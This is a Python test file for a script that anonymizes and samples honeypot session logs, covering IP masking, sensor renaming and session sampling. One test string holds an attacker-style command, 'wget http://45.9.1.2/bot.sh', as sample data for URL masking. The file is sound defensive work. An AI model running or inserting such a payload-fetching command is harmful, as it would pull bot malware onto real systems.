"""Tests for the anonymized sample in analysis/make_sample.py."""
from make_sample import anonymize, mask, sample_sessions


def test_masks_ips_inside_text():
    msg = "New connection: 185.220.101.7:51234 (172.31.44.174:2222)"
    assert mask(msg) == "New connection: 185.220.x.x:51234 (172.31.x.x:2222)"


def test_masks_ips_in_urls_and_lists():
    assert mask("wget http://45.9.1.2/bot.sh") == "wget http://45.9.x.x/bot.sh"
    assert mask(["1.2.3.4", 5, True]) == ["1.2.x.x", 5, True]


def test_leaves_other_text_alone():
    assert mask("uname -a") == "uname -a"
    assert mask(2222) == 2222


def test_anonymize_hides_sensor_and_ips():
    event = {"src_ip": "185.220.101.7", "dst_ip": "172.31.44.174",
             "sensor": "ip-172-31-44-174", "eventid": "cowrie.session.connect"}
    out = anonymize(event)
    assert out["src_ip"] == "185.220.x.x"
    assert out["dst_ip"] == "172.31.x.x"
    assert out["sensor"] == "honeypot"
    assert out["eventid"] == "cowrie.session.connect"


def events_for(session, ip, n):
    return [{"session": session, "src_ip": ip, "timestamp": f"2026-11-24T11:00:0{i}Z"}
            for i in range(n)]


def test_drops_my_own_sessions():
    events = (events_for("me", "203.0.113.7", 3)
              + events_for("local", "127.0.0.1", 2)
              + events_for("bot", "185.220.101.7", 4))
    picked = sample_sessions(events, exclude_ips={"127.0.0.1", "203.0.113.7"})
    assert {e["session"] for e in picked} == {"bot"}


def test_keeps_whole_sessions_and_stops_near_target():
    events = []
    for i in range(10):
        events += events_for(f"s{i}", f"10.0.0.{i}", 3)
    picked = sample_sessions(events, exclude_ips=set(), target=7)

    # 3 whole sessions of 3 events: stops once it reaches at least 7
    assert len(picked) == 9
    sessions = {e["session"] for e in picked}
    assert all(sum(e["session"] == s for e in picked) == 3 for s in sessions)


def test_same_seed_same_sample():
    events = []
    for i in range(10):
        events += events_for(f"s{i}", f"10.0.0.{i}", 2)
    first = sample_sessions(events, exclude_ips=set(), target=4)
    second = sample_sessions(events, exclude_ips=set(), target=4)
    assert first == second
